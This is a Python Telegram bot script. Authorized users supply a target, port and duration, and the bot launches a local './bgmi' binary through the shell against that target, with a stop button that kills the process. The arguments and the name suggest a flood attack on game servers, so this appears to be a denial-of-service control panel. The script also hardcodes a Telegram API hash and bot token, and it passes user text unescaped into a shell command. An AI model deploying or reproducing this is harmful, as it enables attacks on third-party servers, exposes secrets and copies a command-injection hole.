import time
import sqlite3
import subprocess
from telethon import TelegramClient, events, Button

# Database setup with thread-safe access
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()

# Create users table if it doesn't exist
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, credits INTEGER DEFAULT 0)''')
conn.commit()

# Function to handle retries on SQLite database lock
def execute_with_retry(query, params=(), retries=5, delay=1):
    for _ in range(retries):
        try:
            c.execute(query, params)
            conn.commit()
            return
        except sqlite3.OperationalError as e:
            if 'locked' in str(e):
                time.sleep(delay)
            else:
                raise e

Apid = 22157690
Apihash = "819a20b5347be3a190163fff29d59d81"
tken = "7483201528:AAGLZzUEMYYN-wYmYUUwD8eVOQyiflG8-d4"
SEMXUSER = 2092103173

client = TelegramClient('R5O60D', Apid, Apihash).start(bot_token=tken)

async def is_authorized(user_id):
    """ Check if the user is in the database. """
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return c.fetchone() is not None

@client.on(events.NewMessage(pattern=r'#b (\S+) (\d+) (\d+)'))
async def handle_bgmi(event):
    user_id = event.sender_id
    if not await is_authorized(user_id):
        await event.reply("**You are not authorized to use this command.**")
        return

    target, port, time_ = event.pattern_match.groups()

    # Send inline buttons
    buttons = [
        [Button.inline("Start", data=f'start_{target}_{port}_{time_}'),
         Button.inline("Stop", data=f'stop_{target}_{port}_{time_}')]
    ]
    
    await event.reply("Control BGMI execution:", buttons=buttons)

@client.on(events.CallbackQuery(pattern=b'start_(\\S+)_(\\d+)_(\\d+)'))
async def start_bgmi(event):
    target, port, time_ = event.data.decode().split('_')[1:]

    command = f'./bgmi {target} {port} {time_} 200'

    # Run the command asynchronously
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await event.answer("BGMI started.", alert=True)
    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)

@client.on(events.CallbackQuery(pattern=b'stop_(\\S+)_(\\d+)_(\\d+)'))
async def stop_bgmi(event):
    target, port, time_ = event.data.decode().split('_')[1:]

    command_pattern = f'./bgmi {target} {port} {time_} 200'

    try:
        # Stop the bgmi command by using pkill with a pattern match
        subprocess.Popen(f'pkill -f "{command_pattern}"', shell=True)
        await event.answer("BGMI process stopped.", alert=True)
    except Exception as e:
        await event.answer(f"Error: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/add'))
async def add(event):
    if event.sender_id != SEMXUSER:
        await event.reply("**You are not authorized to use this command.**")
        return
    try:
        _, Infouser = event.message.message.split()
        user_id = Infouser if Infouser.isdigit() else None
        if user_id is None:
            user = await client.get_entity(Infouser)
            user_id = user.id
        
        execute_with_retry('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, Infouser))
        await event.reply(f"**Added {Infouser} to authorized users.**")
    except Exception as e:
        await event.reply(f"Error: {str(e)}")

@client.on(events.NewMessage(pattern='/remove'))
async def remove(event):
    if event.sender_id != SEMXUSER:
        await event.reply("**You are not authorized to use this command.**")
        return
    try:
        _, Infouser = event.message.message.split()
        user_id = Infouser if Infouser.isdigit() else None
        if user_id is None:
            user = await client.get_entity(Infouser)
            user_id = user.id
        
        execute_with_retry('DELETE FROM users WHERE user_id = ?', (user_id,))
        await event.reply(f"**Removed {Infouser} from authorized users.**")
    except Exception as e:
        await event.reply(f"Error: {str(e)}")

client.start()
client.run_until_disconnected()
        
